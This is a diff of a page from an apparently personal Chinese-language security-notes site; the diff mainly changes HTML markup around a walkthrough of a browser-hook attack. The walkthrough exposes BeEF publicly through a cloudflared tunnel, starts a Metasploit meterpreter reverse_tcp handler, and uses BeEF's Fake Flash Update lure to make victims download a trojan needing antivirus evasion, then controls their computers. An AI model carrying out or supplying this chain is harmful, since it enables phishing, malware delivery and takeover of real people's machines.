-<h3 class="section-title">---</h3>
+<span class="tip-inline">&lt;li class="content-list-item"&gt;</span>---<span class="tip-inline">&lt;/li&gt;</span>
 <p class="content-p">暴露本地的 3000 端口（BeEF）</p>
-<p class="content-p">cloudflared tunnel --url <span class="tip-text">&lt;a href="http://localhost:3000" target="_blank" class="content-link"&gt;</span>http://localhost:3000<span class="tip-text">&lt;/a&gt;</span></p>
-<h3 class="section-title">---</h3>
+<p class="content-p">cloudflared tunnel --url <span class="tip-inline">&lt;a href="http://localhost:3000" target="_blank" class="content-link"&gt;</span>http://localhost:3000<span class="tip-inline">&lt;/a&gt;</span></p>
+<span class="tip-inline">&lt;li class="content-list-item"&gt;</span>---<span class="tip-inline">&lt;/li&gt;</span>
 <p class="content-p">以上操作是把链接暴露在公网里面，让其他地方的人都能访问</p>
 <p class="content-p">&gt; BEEF与MSF联合使用</p>
 <p class="content-p">MSF是kali里面的，不是win11主机上的</p>
 <p class="content-p">当BeEF帮你“勾住”了对方的浏览器后，MSF的作用就是帮你把攻击从“浏览器层面”推进到“操作系统层面”，实现对目标电脑的真正控制。</p>
-<h3 class="section-title">---</h3>
+<span class="tip-inline">&lt;li class="content-list-item"&gt;</span>---<span class="tip-inline">&lt;/li&gt;</span>
 <p class="content-p">Kali虚拟机终端</p>
-<p class="content-p">打开MSF：msfconsole</p>
+<p class="content-p">打开MSF：msfconsole   </p>
 <p class="content-p">执行控制命令，比如</p>
 <p class="content-p">监听操作：</p>
 <p class="content-p">handler -H 192.168.1.163 -P 4444 -p windows/meterpreter/reverse_tcp</p>
@@ -354,26 +397,28 @@
 <p class="content-p">（f后跟文件类型，o后面跟输出目录和文件名）</p>
 <p class="content-p">cd /var/www/html</p>
 <p class="content-p">ls</p>
-<h3 class="section-title">---</h3>
+<span class="tip-inline">&lt;li class="content-list-item"&gt;</span>---<span class="tip-inline">&lt;/li&gt;</span>
 <p class="content-p">接下来还可以在beef里面修改弹窗页面(让弹窗变得好看点)</p>
 <p class="content-p">点击钩到的浏览器IP——命令——社会工程学——Fake Flash Update</p>
 <p class="content-p">这里可以让弹窗变得好看点</p>
 <p class="content-p">执行后，被勾到的主机(比如win11)，会出现一个特别的弹窗，点击弹窗，受害者浏览器会自动下载木马程序FlashUpdate.exe（这个需要免杀操作，否则会被防火墙直接杀掉）</p>
-<h3 class="section-title">---</h3>
+<span class="tip-inline">&lt;li class="content-list-item"&gt;</span>---<span class="tip-inline">&lt;/li&gt;</span>
 <p class="content-p">受害者点击.exe运行后，kali虚拟机里的MSF&gt; 会发生变化</p>
 <p class="content-p">Session 进行查看</p>
 <p class="content-p">反正就是利用MSF，可以对受害者电脑进行各种操作</p>
-<h3 class="section-title">---</h3>
+<span class="tip-inline">&lt;li class="content-list-item"&gt;</span>---<span class="tip-inline">&lt;/li&gt;</span>
 <p class="content-p">一句话，beef只能对受害者浏览器进行操作，MSF可以通过kali终端 敲命令对受害者整台电脑进行操作</p>
 <p class="content-p">MSf敲命令，浪费时间还吃技术</p>
 <p class="content-p">但是MSF 不像普通软件那样有“连接”按钮，但确实可以绕过繁琐的命令行：</p>
 <p class="content-p">使用 Armitage 或 Kage 这类图形界面工具来操作 MSF，两个工具在windows linux系统都能用，但是kali不自带，需要自己装</p>
 <p class="content-p">&gt; 一条链接获取对方定位</p>
-<h3 class="section-title">-ubuntu虚拟机，（websec），装图形化页面</h3>
+<span class="tip-inline">&lt;li class="content-list-item"&gt;</span>-ubuntu虚拟机，（websec），装图形化页面<span class="tip-inline">&lt;/li&gt;</span>
 <p class="content-p">sudo apt update</p>
 <p class="content-p">sudo apt install ubuntu-desktop -y</p>
+      
+      <div class="chapter-nav"><a href="chapter5.html" class="nav-link"><i class="fa fa-arrow-left"></i> 上一章</a><a href="chapter7.html" class="nav-link">下一章 <i class="fa fa-arrow-right"></i></a></div>
     </div>
-
+    
     <div class="footer">
       <p>📝 网络安全宝典（续）· 原创笔记 | 我的博客</p>
     </div>
